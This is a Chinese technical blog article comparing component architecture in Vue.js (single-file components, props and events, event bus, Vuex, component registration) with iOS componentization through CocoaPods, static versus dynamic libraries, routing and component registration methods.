<p>如果在简单的 SPA 项目中，可以直接用 Vue.component 去定义一个全局组件，项目一旦复杂以后，就会出现弊端了：</p>
<ol>
<li><p>全局定义(Global definitions) 强制要求每个 component 中的命名不得重复</p></li>
<li><p>字符串模板(String templates) 缺乏语法高亮，在 HTML 有多行的时候，需要用到丑陋的 \</p></li>
<li><p>不支持 CSS(No CSS support) 意味着当 HTML 和 JavaScript 组件化时，CSS 明显被遗漏</p></li>
<li><p>没有构建步骤(No build step) 限制只能使用 HTML 和 ES5 JavaScript, 而不能使用预处理器，如 Pug (formerly Jade) 和 Babel</p></li>
</ol>
<p>而且现在公司级的项目，大多数都会引入工程化的管理，用包管理工具去管理，npm 或者 yarn。所以 Vue 在复杂的项目中用 Vue.component 去定义一个组件的方式就不适合了。这里就需要用到单文件组件，还可以使用 Webpack 或 Browserify 等构建工具。比如下面这个Hello.vue组件，整个文件就是一个组件。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122337"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在单文件组件中，整个文件都是一个 <a href=""https://webpack.js.org/concepts/modules/#what-is-a-webpack-module"" rel=""nofollow noreferrer"">CommonJS 模块</a>，里面包含了组件对应的 HTML、组件内的处理逻辑 Javascript、组件的样式 CSS。</p>
<p>在组件的 script 标签中，需要封装该组件 ViewModel 的行为。</p>
<ul>
<li><p>data<br>  组件的初始化数据，以及私有属性。</p></li>
<li><p>props<br>  组件的属性，这里的属性专门用来接收父子组件通信的数据。（这里可以类比 iOS 里面的 @property ）</p></li>
<li><p>methods<br>  组件内的处理逻辑函数。</p></li>
<li><p>watch<br>  需要额外监听的属性（这里可以类比 iOS 里面的 KVO ）</p></li>
<li><p>computed<br>  组件的计算属性</p></li>
<li><p>components<br>  所用到的子组件</p></li>
<li><p>lifecycle hooks<br>  生命周期的钩子函数。一个组件也是有生命周期的，有如下这些：<a href=""https://cn.vuejs.org/v2/api/#beforeCreate"" rel=""nofollow noreferrer"">beforeCreate</a>、<a href=""https://cn.vuejs.org/v2/api/#created"" rel=""nofollow noreferrer"">created</a>、<a href=""https://cn.vuejs.org/v2/api/#beforeMount"" rel=""nofollow noreferrer"">beforeMount</a>、<a href=""https://cn.vuejs.org/v2/api/#mounted"" rel=""nofollow noreferrer"">mounted</a>、<a href=""https://cn.vuejs.org/v2/api/#beforeUpdate"" rel=""nofollow noreferrer"">beforeUpdate</a>、<a href=""https://cn.vuejs.org/v2/api/#updated"" rel=""nofollow noreferrer"">updated</a>、<a href=""https://cn.vuejs.org/v2/api/#activated"" rel=""nofollow noreferrer"">activated</a>、<a href=""https://cn.vuejs.org/v2/api/#deactivated"" rel=""nofollow noreferrer"">deactivated</a>、<a href=""https://cn.vuejs.org/v2/api/#beforeDestroy"" rel=""nofollow noreferrer"">beforeDestroy</a>、<a href=""https://cn.vuejs.org/v2/api/#destroyed"" rel=""nofollow noreferrer"">destroyed</a>等生命周期。在这些钩子函数里面可以加上我们预设的处理逻辑。（这里可以类比 iOS 里面的 ViewController 的生命周期 ）</p></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122338"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>如此看来，在 Vue 里面封装一个单文件组件，和在 iOS 里面封装一个 ViewModel 的思路是完全一致的。接下来的讨论无特殊说明，针对的都是单文件组件。</p>
<h3>三. 如何划分组件</h3>
<p>一般划分组件分可以按照以下标准去划分：</p>
<ol>
<li>
<p>页面区域：</p>
<pre><code>header、footer、sidebar……</code></pre>
</li>
<li>
<p>功能模块：</p>
<pre><code>select、pagenation……
</code></pre>
</li>
</ol>
<p>这里举个例子来说明一起前端是如何划分组件的。</p>
<h4>1. 页面区域</h4>
<p>还是以 <a href=""https://objccn.io/"" rel=""nofollow noreferrer"">objc中国</a> 的首页页面为例</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122339"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>我们可以把上面的页面按照布局，先抽象图片中间的样子，然后接着按照页面的区域划分组件，最后可以得到最右边的组件树。</p>
<p>在 Vue 实例的根组件，加载 layout。</p>
<pre><code class=""javascript"">
import Vue from 'vue';
import store from './store';
import router from './router';
import Layout from './components/layout';

new Vue({
  el: '#app',
  router,
  store,
  template: '&lt;Layout/&gt;',
  components: {
    Layout
  }
});

</code></pre>
<p>根据抽象出来的组件树，可以进一步的向下细分各个小组件。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122340"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>layout 下一层的组件是 header、footer、content，这三部分就组成了 layout.vue 单文件组件的全部部分。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122341"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>上图就是我们的 layout.vue 的全部实现。在这个单文件组件中里面引用了三个子组件，navigationBar、footerView、content。由于 content 里面是又各个路由页面组成，所以这里声明成 router-view。</p>
<p>至于各个子组件的具体实现这里就不在赘述了，具体代码可以看这里<a href=""https://github.com/halfrost/vue-objccn/blob/master/src/components/navigationBar.vue"" rel=""nofollow noreferrer"">navigationBar.vue</a>、<a href=""https://github.com/halfrost/vue-objccn/blob/master/src/components/footerView.vue"" rel=""nofollow noreferrer"">footerView</a>、<a href=""https://github.com/halfrost/vue-objccn/blob/master/src/components/layout.vue"" rel=""nofollow noreferrer"">layout.vue</a></p>
<h4>2. 功能模块</h4>
<p>一般项目里面详情页的内容最多，我们就以以 <a href=""https://objccn.io/products/functional-swift/"" rel=""nofollow noreferrer"">objc中国</a> 的详情页面为例</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122342"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>上图左边是详情页，右图是按照功能区分的图，我们把整个页面划分为6个子组件。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122343"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>从上往下依次展开，见上图。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122344"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>经过功能上的划分以后，整个详情页面的代码变的异常清爽，整个页面就是6个单文件的子组件，每个子组件的逻辑封装在各自的组件里面，详情页面就是把他们都组装在了一起，代码可读性高，后期维护也非常方便。</p>
<p>详情页面具体的代码在这里<a href=""https://github.com/halfrost/vue-objccn/blob/master/src/pages/productsDetailInfo.vue"" rel=""nofollow noreferrer"">https://github.com/halfrost/vue-objccn/blob/master/src/pages/productsDetailInfo.vue</a></p>
<p>6个子组件的代码在这里<a href=""https://github.com/halfrost/vue-objccn/tree/master/src/components/productsDetailInfo"" rel=""nofollow noreferrer"">https://github.com/halfrost/vue-objccn/tree/master/src/components/productsDetailInfo</a>，具体的代码见链接，这里就不在赘述了。</p>
<p>综上可以看出，前端 SPA 页面抽象出来就是一个大的组件树。</p>
<h3>四. 组件化原理</h3>
<p>举个例子：</p>
<pre><code class=""javascript"">

&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;body&gt;
        &lt;div id=""app""&gt;
            &lt;parent-component&gt;
            &lt;/parent-component&gt;
        &lt;/div&gt;
    &lt;/body&gt;
    &lt;script src=""js/vue.js""&gt;&lt;/script&gt;
    &lt;script&gt;
        
        var Child = Vue.extend({
            template: '&lt;p&gt;This is a child component !&lt;/p&gt;'
        })
        
        var Parent = Vue.extend({
            // 在Parent组件内使用&lt;child-component&gt;标签
            template :'&lt;p&gt;This is a Parent component !&lt;/p&gt;&lt;child-component&gt;&lt;/child-component&gt;',
            components: {
                // 局部注册Child组件，该组件只能在Parent组件内使用
                'child-component': Child
            }
        })
        
        // 全局注册Parent组件
        Vue.component('parent-component', Parent)
        
        new Vue({
            el: '#app'
        })
        
    &lt;/script&gt;
&lt;/html&gt;
</code></pre>
<p>在上面的例子中，在 <code>&lt;parent-component&gt;</code> 父组件里面声明了一个 <code>&lt;child-component&gt;</code>，最终渲染出来的结果是：</p>
<pre><code class=""javascript"">
This is a Parent component !
This is a child component !
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122345"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>上述代码的执行顺序如下：</p>
<ol>
<li><p>子组件先在父组件中的 components 中进行注册。</p></li>
<li><p>父组件利用 Vue.component 注册到全局。</p></li>
<li><p>当渲染父组件的时候，渲染到 <code>&lt;child-component&gt;</code> ，会把子组件也渲染出来。</p></li>
</ol>
<p>值得说明的一点是，Vue 进行模板解析的时候会遵循以下 html 常见的限制：</p>
<ul>
<li><p>a 不能包含其它的交互元素（如按钮，链接）</p></li>
<li><p>ul 和 ol 只能直接包含 li</p></li>
<li><p>select 只能包含 option 和 optgroup</p></li>
<li><p>table 只能直接包含 thead, tbody, tfoot, tr, caption, col, colgroup</p></li>
<li><p>tr 只能直接包含 th 和 td</p></li>
</ul>
<h3>五. 组件分类</h3>
<p>组件的种类可分为以下4种：</p>
<ol>
<li><p>普通组件</p></li>
<li><p>动态组件</p></li>
<li><p>异步组件</p></li>
<li><p>递归组件</p></li>
</ol>
<h4>1. 普通组件</h4>
<p>之前讲的都是普通的组件，这里就不在赘述了。</p>
<h4>2. 动态组件</h4>
<p>动态组件利用的是 <code>is</code> 的特性，可以设置多个组件可以使用同一个挂载点，并动态切换。</p>
<pre><code class=""javascript"">
var vm = new Vue({
  el: '#example',
  data: {
    currentView: 'home'
  },
  components: {
    home: { /* ... */ },
    posts: { /* ... */ },
    archive: { /* ... */ }
  }
})


&lt;component v-bind:is=""currentView""&gt;
  &lt;!-- 组件在 vm.currentview 变化时改变！ --&gt;
&lt;/component&gt;
</code></pre>
<p>现在 <code>&lt;component&gt;</code> 组件的具体类型用 currentView 来表示了，我们就可以通过更改 currentView 的值，来动态加载各个组件。上述例子中，可以不断的更改 data 里面的 currentView ，来达到动态加载 home、posts、archive 三个不同组件的目的。</p>
<h4>3. 异步组件</h4>
<p>Vue允许将组件定义为一个工厂函数，在组件需要渲染时触发工厂函数动态地解析组件，并且将结果缓存起来：</p>
<pre><code class=""javascript"">
Vue.component(""async-component"", function(resolve, reject){
    // async operation
    setTimeout(function() {
        resolve({
            template: '&lt;div&gt;something async&lt;/div&gt;'
        });
    },1000);
});
</code></pre>
<p>动态组件可配合 webpack 实现代码分割，webpack 可以将代码分割成块，在需要此块时再使用 ajax 的方式下载：</p>
<pre><code class=""javascript"">
Vue.component('async-webpack-example', function(resolve) {
  // 这个特殊的 require 语法告诉 webpack
  // 自动将编译后的代码分割成不同的块，
  // 这些块将通过 ajax 请求自动下载。
  require(['./my-async-component'], resolve)
});
</code></pre>
<h4>4. 递归组件</h4>
<p>如果一个组件设置了 name 属性，那么它就可以变成递归组件了。</p>
<p>递归组件可以利用模板里面的 name 不断的递归调用自己。</p>
<pre><code class=""javascript"">
name: 'recursion-component',
template: '&lt;div&gt;&lt;recursion-component&gt;&lt;/recursion-component&gt;&lt;/div&gt;'
</code></pre>
<p>上面这段代码是一个错误代码，这样写模板的话就会导致递归死循环，最终报错 “max stack size exceeded”。解决办法需要打破死循环，比如 v-if 返回 false。</p>
<h3>六. 组件间的消息传递和状态管理</h3>
<p>在 Vue 中，组件消息传递的方式主要分为3种：</p>
<ol>
<li><p>父子组件之间的消息传递</p></li>
<li><p>Event Bus</p></li>
<li><p>Vuex 单向数据流</p></li>
</ol>
<h4>1. 父子组件之间的消息传递</h4>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122346"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>父子组件的传递方式比较单一，在 Vue 2.0 以后，父子组件的关系可以总结为 <strong> props down, events up </strong>。父组件通过 props 向下传递数据给子组件，子组件通过 events 给父组件发送消息。</p>
<h4>父向子传递</h4>
<p>举个例子：</p>
<pre><code class=""javascript"">
Vue.component('child', {
  // 声明 props
  props: ['msg'],
  // prop 可以用在模板内
  // 可以用 `this.msg` 设置
  template: '&lt;span&gt;{{ msg }}&lt;/span&gt;'
})

&lt;child msg=""hello!""&gt;&lt;/child&gt;
</code></pre>
<p>在 child 组件的 props 中声明了一个 msg 属性，在父组件中利用这个属性把值传给子组件。</p>
<p>这里有一点需要注意的是，在非字符串模板中， camelCased (驼峰式) 命名的 prop 需要转换为相对应的 kebab-case (短横线隔开式) 命名。</p>
<p>上面这个例子是静态的绑定，Vue 也支持动态绑定，这里也支持 v-bind 指令进行动态的绑定 props 。</p>
<p>父向子传递是一个单向数据流的过程，prop 是单向绑定的：当父组件的属性变化时，将传导给子组件，但是不会反过来。这是为了防止子组件无意修改了父组件的状态——这会让应用的数据流难以理解。</p>
<p>另外，每次父组件更新时，子组件的所有 prop 都会更新为最新值。这意味着你不应该在子组件内部改变 prop。Vue 建议子组件的 props 是 immutable 的。</p>
<p>这里就会牵涉到2类问题：</p>
<ol>
<li><p>由于单向数据流的原因，会导致子组件的数据或者状态和父组件的不一致，为了同步，在子组件里面反数据流的去修改父组件的数据或者数据。</p></li>
<li><p>子组件接收到了 props 的值以后，有2种原因想要改变它，第一种原因是，prop 作为初始值传入后，子组件想把它当作局部数据来用；第二种原因是，prop 作为初始值传入，由子组件处理成其它数据输出。</p></li>
</ol>
<p>这两类问题，开发者强行更改，也都是可以实现的，但是会导致不令人满意的 “后果” 。第一个问题强行手动修改父组件的数据或者状态以后，导致数据流混乱不堪。只看父组件，很难理解父组件的状态。因为它可能被任意子组件修改！理想情况下，只有组件自己能修改它的状态。第二个问题强行手动修改子组件的 props 以后，Vue 会在控制台给出警告。</p>
<p>如果优雅的解决这2种问题呢？一个个的来说：</p>
<h4>（1）第一个问题，换成双向绑定就可以解决。</h4>
<p>在 Vue 2.3.0+ 以后的版本，双向绑定有2种方式</p>
<p>第一种方式：  </p>
<p>利用 <code>.sync</code> 修饰符，在 Vue 2.3.0+ 以后作为一个编译时的语法糖存在。它会被扩展为一个自动更新父组件属性的 v-on 侦听器。</p>
<pre><code class=""javascript"">
// 声明一个双向绑定
&lt;comp :foo.sync=""bar""&gt;&lt;/comp&gt;


// 上面一行代码会被会被扩展为下面这一行：
&lt;comp :foo=""bar"" @update:foo=""val =&gt; bar = val""&gt;&lt;/comp&gt;

// 当子组件需要更新 foo 的值时，它会显式地触发一个更新事件：
this.$emit('update:foo', newValue)
</code></pre>
<p>第二种方式：</p>
<p>自定义事件可以用来创建自定义的表单输入组件，使用 v-model 来进行数据双向绑定。</p>
<pre><code class=""javascript"">
&lt;input :value=""value"" @input=""updateValue($event.target.value)"" &gt;
</code></pre>
<p>在这种方式下进行的双向绑定必须满足2个条件：</p>
<ul>
<li><p>接受一个 value 属性</p></li>
<li><p>在有新的值时触发 input 事件</p></li>
</ul>
<p>官方推荐的2种双向绑定的方式就是上述2种方法。不过还有一些隐性的双向绑定，可能无意间就会造成bug的产生。</p>
<p>pros 是单向数据传递，父组件把数据传递给子组件，需要尤其注意的是，传递的数据如果是引用类型（比如数组和对象），那么默认就是双向数据绑定，子组件的更改都会影响到父组件里面。在这种情况下，如果人为不知情，就会出现一些莫名其妙的bug，所以需要注意引用类型的数据传递。</p>
<h4>（2）第二个问题，有两种做法：</h4>
<ul><li><p>第一种做法是：定义一个局部变量，并用 prop 的值初始化它：</p></li></ul>
<pre><code class=""javascript"">
props: ['initialCounter'],
data: function () {
  return { counter: this.initialCounter }
}
</code></pre>
<ul><li><p>第二种做法是：定义一个计算属性，处理 prop 的值并返回。</p></li></ul>
<pre><code class=""javascript"">
props: ['size'],
computed: {
  normalizedSize: function () {
    return this.size.trim().toLowerCase()
  }
}
</code></pre>
<p>父向子传递还可以传递模板，使用 slot 分发内容。</p>
<p>slot 是 Vue 的一个内置的自定义元素指令。slot 在 bind 回调函数中，根据 name 获取将要替换插槽的元素，如果上下文环境中有所需替换的内容，则调用父元素的 replaceChild 方法，用替换元素讲 slot 元素替换；否则直接删除将要替换的元素。如果替换插槽元素中有一个顶级元素，且顶级元素的第一子节点为 DOM 元素，且该节点有 v-if 指令，且 slot 元素中有内容，则替换模板将增加 v-else 模板放入插槽中的内容。如果 v-if 指令为 false，则渲染 else 模板内容。</p>
<h4>子向父传递</h4>
<p>子组件要把数据传递回父组件，方式很单一，那利用自定义事件！</p>
<p>父组件使用 $on(eventName) 监听事件<br>子组件使用 $emit(eventName) 触发事件</p>
<p>举个简单的例子：</p>
<pre><code class=""javascript"">
// 在子组件里面有一个 button
&lt;button @click=""emitMyEvent""&gt;emit&lt;/button&gt;

emitMyEvent() {
  this.$emit('my-event', this.hello);
}


// 在父组件里面监听子组件的自定义事件
&lt;child @my-event=""getMyEvent""&gt;&lt;/child&gt;

getMyEvent() {
    console.log(' i got child event ');
}

</code></pre>
<p>这里也可以通过父子之间的关系进行传递数据（直接修改数据），但是不推荐这种方法，例如 this.$parent 或者 this.$children 直接调用父或者子组件的方法，这里类比iOS里面的ViewControllers方法，在这个数组里面可以直接拿到所有 VC ，然后就可以调用他们暴露在.h里面的方法了。但是这种方式相互直接耦合性太大了。</p>
<h4>2. Event Bus</h4>
<p>Event Bus 这个概念对移动端的同学来说也比较熟悉，因为在安卓开发中就有这个概念。在 iOS 开发中，可以类比消息总线。具体实现可以是通知 Notification 或者 ReactiveCocoa 中的信号传递。</p>
<p>Event Bus 的实现还是借助 Vue 的实例。新建一个新的 Vue，专门用来做消息总线。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122347"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<pre><code class=""javascript"">
var eventBus = new Vue()

// 在 A 组件中引入 eventBus
eventBus.$emit('myEvent', 1)

// 在要监听的组件中监听
eventBus.$on('id-selected', () =&gt; {
  // ...
})
</code></pre>
<h4>3. Vuex 单向数据流</h4>
<p>由于本篇文章重点讨论组件化的问题，所以这里 Vuex 只是说明用法，至于原理的东西之后会单独开一篇文章来分析。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122348"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>这一张图就描述了 Vuex 是什么。Vuex 专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。</p>
<p>上图中箭头的指向就描述了数据的流向。数据的流向是单向的，从 Actions 流向 State，State 中的数据改变了从而影响到 View 展示数据的变化。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122349"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>从简单的 Actions、State、View 三个角色，到现在增加了一个 Mutations。Mutations 现在变成了更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutations 非常类似于事件：每个 mutation 都有一个字符串的 事件类型 (type) 和 一个 回调函数 (handler)。</p>
<p>一般在组件中进行 commit 调用 Mutation 方法</p>
<pre><code class=""javascript"">
this.$store.commit('increment', payload);
</code></pre>
<p>Actions 和 Mutations 的区别在于：</p>
<ul>
<li><p>Action 提交的是 mutation，而不是直接变更状态。</p></li>
<li><p>Action 可以包含任意异步操作，而 Mutations 必须是同步函数。</p></li>
</ul>
<p>一般在组件中进行 dispatch 调用 Actions 方法</p>
<pre><code class=""javascript"">
this.$store.dispatch('increment');
</code></pre>
<p>Vuex 官方针对 Vuex 的最佳实践，给出了一个项目模板结构，希望大家都能按照这种模式去组织我们的项目。</p>
<pre><code class=""javascript"">

├── index.html
├── main.js
├── api
│   └── ... # 抽取出API请求
├── components
│   ├── App.vue
│   └── ...
└── store
    ├── index.js          # 我们组装模块并导出 store 的地方
    ├── actions.js        # 根级别的 action
    ├── mutations.js      # 根级别的 mutation
    └── modules
        ├── cart.js       # 购物车模块
        └── products.js   # 产品模块
</code></pre>
<p>关于这个例子的详细代码在<a href=""https://github.com/vuejs/vuex/tree/dev/examples/shopping-cart"" rel=""nofollow noreferrer"">这里</a></p>
<h3>七. 组件注册方式</h3>
<p>组件的注册方式主要就分为2种：全局注册和局部注册</p>
<h4>1. 全局注册</h4>
<p>利用 Vue.component 指令进行全局注册</p>
<pre><code class=""javascript"">
Vue.component('my-component', {
  // 选项
})
</code></pre>
<p>注册完的组件就可以在父实例中以自定义元素 <code>&lt;my-component&gt;&lt;/my-component&gt;</code> 的形式使用。</p>
<pre><code class=""javascript"">
// 注册
Vue.component('my-component', {
  template: '&lt;div&gt;A custom component!&lt;/div&gt;'
})
// 创建根实例
new Vue({
  el: '#example'
})

&lt;div id=""example""&gt;
  &lt;my-component&gt;&lt;/my-component&gt;
&lt;/div&gt;
</code></pre>
<h4>2. 局部注册</h4>
<p>全局注册组件会拖慢一些页面的加载速度，有些组件只需要用的到时候再加载，所以不必在全局注册每个组件。于是就有了局部注册的方式。</p>
<pre><code class=""javascript"">

var Child = {
  template: '&lt;div&gt;A custom component!&lt;/div&gt;'
}
new Vue({
  // ...
  components: {
    // &lt;my-component&gt; 将只在父模板可用
    'my-component': Child
  }
})
</code></pre>
<hr>
<h2>iOS 篇</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122350"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h3>一. 组件化的需求</h3>
<p>在 iOS Native app 前期开发的时候，如果参与的开发人员也不多，那么代码大多数都是写在一个工程里面的，这个时候业务发展也不是太快，所以很多时候也能保证开发效率。</p>
<p>但是一旦项目工程庞大以后，开发人员也会逐渐多起来，业务发展突飞猛进，这个时候单一的工程开发模式就会暴露出弊端了。</p>
<ul>
<li><p>项目内代码文件耦合比较严重</p></li>
<li><p>容易出现冲突，大公司同时开发一个项目的人多，每次 pull 一下最新代码就会有很多冲突，有时候合并代码需要半个小时左右，这会耽误开发效率。</p></li>
<li><p>业务方的开发效率不够高，开发人员一多，每个人都只想关心自己的组件，但是却要编译整个项目，与其他不相干的代码糅合在一起。调试起来也不方便，即使开发一个很小的功能，都要去把整个项目都编译一遍，调试效率低。</p></li>
</ul>
<p>为了解决这些问题，iOS 项目就出现了组件化的概念。所以 iOS 的组件化是为了解决上述这些问题的，这里与前端组件化解决的痛点不同。</p>
<p>iOS 组件化以后能带来如下的好处：</p>
<ul>
<li><p>加快编译速度（不用编译主客那一大坨代码了，各个组件都是静态库）</p></li>
<li><p>自由选择开发姿势（MVC / MVVM / FRP）</p></li>
<li><p>方便 QA 有针对性地测试</p></li>
<li><p>提高业务开发效率</p></li>
</ul>
<p>iOS 组件化的封装性只是其中的一小部分，更加关心的是如何拆分组件，如何解除耦合。前端的组件化可能会更加注重组件的封装性，高可复用性。</p>
<h3>二. 如何封装组件</h3>
<p>iOS 的组件化手段非常单一，就是利用 Cocoapods 封装成 pod 库，主工程分别引用这些 pod 即可。越来越多的第三方库也都在 Cocoapods 上发布自己的最新版本，大公司也在公司内部维护了公司私有的 Cocoapods 仓库。一个封装完美的 Pod 组件，主工程使用起来非常方便。</p>
<p>具体如果用 Cocoapods 打包一个静态库 .a 或者 framework ，网上教程很多，这里给一个<a href=""http://www.cnblogs.com/brycezhang/p/4117180.html"" rel=""nofollow noreferrer"">链接</a>，详细的操作方法就不再赘述了。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122351"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>最终想要达到的理想目标就是主工程就是一个壳工程，其他所有代码都在组件 Pods 里面，主工程的工作就是初始化，加载这些组件的，没有其他任何代码了。</p>
<h3>三. 如何划分组件</h3>
<p>iOS 划分组件虽然没有一个很明确的标准，因为每个项目都不同，划分组件的粗粒度也不同，但是依旧有一个划分的原则。</p>
<p>App之间可以重用的 Util、Category、网络层和本地存储 storage 等等这些东西抽成了 Pod 库。还有些一些和业务相关的，也是在各个App之间重用的。</p>
<p>原则就是：要在App之间共享的代码就应该抽成 Pod 库，把它们作为一个个组件。不在 App 间共享的业务线，也应该抽成 Pod，解除它与工程其他的文件耦合性。</p>
<p>常见的划分方法都是从底层开始动手，网络库，路由，MVVM框架，数据库存储，加密解密，工具类，地图，基础SDK，APM，风控，埋点……从下往上，到了上层就是各个业务方的组件了，最常见的就类似于购物车，我的钱包，登录，注册等。</p>
<h3>四. 组件化原理</h3>
<p>iOS 的组件化是借助 Cocoapods 完成的。关于 Cocoapods 的具体工作原理，可以看这篇文章<a href=""http://draveness.me/cocoapods.html"" rel=""nofollow noreferrer"">《CocoaPods 都做了什么？》</a>。</p>
<p>这里简单的分析一下 pod 进来的库是什么加载到主工程的。</p>
<p>pod 会依据 Podfile 文件里面的依赖库，把这些库的源代码下载下来，并创建好 Pods workspace。当程序编译的时候，会预先执行2个 pod 设置进来的脚本。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122352"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在上面这个脚本中，会把 Pods 里面的打包好的静态库合并到 libPods-XXX.a 这个静态库里面，这个库是主工程依赖的库。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122353"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>上图就是给主项目加载 Pods 库的脚本。</p>
<p>Pods 另外一个脚本是加载资源的。见下图。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122354"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>这里加载的资源是 Pods 库里面的一些图片资源，或者是 Boudle 里面的 xib ，storyboard，音乐资源等等。这些资源也会一起打到 libPods-XXX.a 这个静态库里面。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122355"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>上图就是加载资源的脚本。</p>
<h3>五. 组件分类</h3>
<p>iOS 的组件主要分为2种形式：</p>
<ol>
<li><p>静态库</p></li>
<li><p>动态库</p></li>
</ol>
<p>静态库一般是以 .a 和 .framework 结尾的文件，动态库一般是以 .dylib 和 .framework 结尾的文件。</p>
<p>这里可以看到，一个 .framework 结尾的文件仅仅通过文件类型是无法判断出它是一个静态库还是一个动态库。</p>
<p>静态库和动态库的区别在于：</p>
<ol>
<li><p>.a文件肯定是静态库，.dylib肯定是动态库，.framework可能是静态库也可能是动态库；</p></li>
<li><p>静态库在链接其他库的情况时，它会被完整的复制到可执行文件中，如果多个App都使用了同一个静态库，那么每个App都会拷贝一份，缺点是浪费内存。类似于定义一个基本变量，使用该基本变量是是新复制了一份数据，而不是原来定义的；静态库的好处很明显，编译完成之后，库文件实际上就没有作用了。目标程序没有外部依赖，直接就可以运行。当然其缺点也很明显，就是会使用目标程序的体积增大。</p></li>
<li><p>动态库不会被复制，只有一份，程序运行时动态加载到内存中，系统只会加载一次，多个程序共用一份，节约了内存。而且使用动态库，可以不重新编译连接可执行程序的前提下，更新动态库文件达到更新应用程序的目的。</p></li>
</ol>
<h3>六. 组件间的消息传递和状态管理</h3>
<p>之前我们讨论过了，iOS 组件化十分关注解耦性，这算是组件化的一个重要目的。iOS 各个组件之间消息传递是用路由来实现的。关于路由，笔者曾经写过一篇比较详细的文章，感兴趣的可以来看这篇文章<a href=""https://github.com/halfrost/Halfrost-Field/blob/master/contents/iOSRouter/iOS%20%E7%BB%84%E4%BB%B6%E5%8C%96%20%E2%80%94%E2%80%94%20%E8%B7%AF%E7%94%B1%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90.md"" rel=""nofollow noreferrer"">《iOS 组件化 —— 路由设计思路分析》</a>。</p>
<h3>七. 组件注册方式</h3>
<p>iOS 组件注册的方式主要有3种：</p>
<ol>
<li><p>load方法注册</p></li>
<li><p>读取 plist 文件注册</p></li>
<li><p>Annotation注解方式注册</p></li>
</ol>
<p>前两种方式都比较简单，容易理解。</p>
<p>第一种方式在 load 方法里面利用 Runtime 把组件名和组件实例的映射关系保存到一个全局的字典里，方便程序启动以后可以随时调用。</p>
<p>第二种方式是把组件名和组件实例的映射关系预先写在 plist 文件中。程序需要的时候直接去读取这个 plist 文件。plist 文件可以从服务器读取过来，这样 App 还能有一定的动态性。</p>
<p>第三种方式比较黑科技。利用的是 Mach-o 的数据结构，在程序编程链接成可执行文件的时候，就把相关注册信息直接写入到最终的可执行文件的 Data 数据段内。程序执行以后，直接去那个段内去读取想要的数据即可。</p>
<p>关于这三种做法的详细实现，可以看笔者之前的一篇文章<a href=""https://halfrost.com/beehive/"" rel=""nofollow noreferrer"">《BeeHive —— 一个优雅但还在完善中的解耦框架》</a>，在这篇文章里面详细的分析了上述3种注册过程的具体实现。</p>
<hr>
<h2>总结</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122356"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>经过上面的分析，我们可以看出 Vue 的组件化和 iOS 的组件化区别还是比较大的。</p>
<h3>两者平台上开发方式存在差异</h3>
<p>主要体现在单页应用和类多页应用的差异。</p>
<p>现在前端比较火的一种应用就是单页Web应用（single page web application，SPA），顾名思义，就是只有一张Web页面的应用，是加载单个HTML 页面并在用户与应用程序交互时动态更新该页面的Web应用程序。</p>
